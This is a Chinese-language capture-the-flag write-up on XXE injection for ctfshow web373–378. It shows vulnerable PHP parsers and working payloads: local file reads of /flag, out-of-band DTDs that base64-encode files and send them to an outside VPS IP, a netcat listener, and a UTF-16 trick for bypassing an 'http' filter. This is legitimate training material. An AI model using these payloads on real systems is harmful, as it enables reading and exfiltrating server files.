---
uuid: ac93b49b-0f5f-1cd2-2999-c81a3a9b81f5
title: XXE
date: 2022-07-04 18:08:17
tags:
  - ctfshow
  - xxe
categories:
   - [Web]
   - [CTF]
---
**XXE刷题记录**

![image-20220704180114042](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041801094.png?x-oss-process=hzy)

<!--more-->

首先得先初步了解一下什么是xxe，推荐下面这个

[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)

[XML与xxe注入基础知识](https://www.cnblogs.com/backlion/p/9302528.html)

# web373（有回显）

正常的xxe

```
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
```

```
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<yu22x>
<ctfshow>&xxe;</ctfshow>
</yu22x>
```

![image-20220416181444576](https://img-blog.csdnimg.cn/img_convert/a5454363c363482bd0629229c7011320.png)

# web374-376(无回显)

无回显xxe可以利用自己的vps带外输出。

> 为区分嵌套实体和实体之间的关系，可以通过单双引号来间隔开，引号中嵌套一个参数实体，其`%`号需要写成：`%`，也可写为16进制的`%`

利用vps外带输出有以下步骤：

test.dtd

```xml
<!ENTITY % dtd "<!ENTITY &#x25; xxe  SYSTEM 'http://150.158.181.145:9999/%file;'> ">
%dtd;
%xxe;
```

然后看这题

```
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

payload

```
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % aaa SYSTEM "http://150.158.181.145/test.dtd">
%aaa;
]>
<root>123</root>
```

![image-20220704174218719](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041742678.png?x-oss-process=hzy)

监听

```
nc -lvp 9999
```

![image-20220704174357564](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041743627.png?x-oss-process=hzy)

![image-20220704174422422](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041744477.png?x-oss-process=hzy)

这几题都是这样，就略了

# web377

```
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

过滤了http

使用utf-16进行绕过

脚本就行了

```
import requests
url = 'http://5cbbc523-7be1-47ce-900a-ff43444fc2e4.challenge.ctf.show/'
payload = '''
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://[vps-ip]/xxe.dtd">
%remote;
%send;
]>
'''
payload = payload.encode('utf-16')
rep = requests.post(url=url, data=payload)
print(rep.text)
```

![image-20220704175303954](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041753008.png?x-oss-process=hzy)

![image-20220704175312827](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041753886.png?x-oss-process=hzy)

# web378

是一个登陆界面

![image-20220704175415813](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041754892.png?x-oss-process=hzy)

可以看到是xml形式

![image-20220704175817598](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041758663.png?x-oss-process=hzy)

poaylaod如下

```
import requests
url = 'http://a4dbaa21-b059-41c9-8ce5-6900f508a9aa.challenge.ctf.show/'
payload = '''
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://150.158.181.145/test.dtd">
%remote;
%send;
]>
'''
payload = payload.encode('utf-16')
rep = requests.post(url=url, data=payload)
print(rep.text)
```

![image-20220704175900019](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207041759097.png?x-oss-process=hzy)
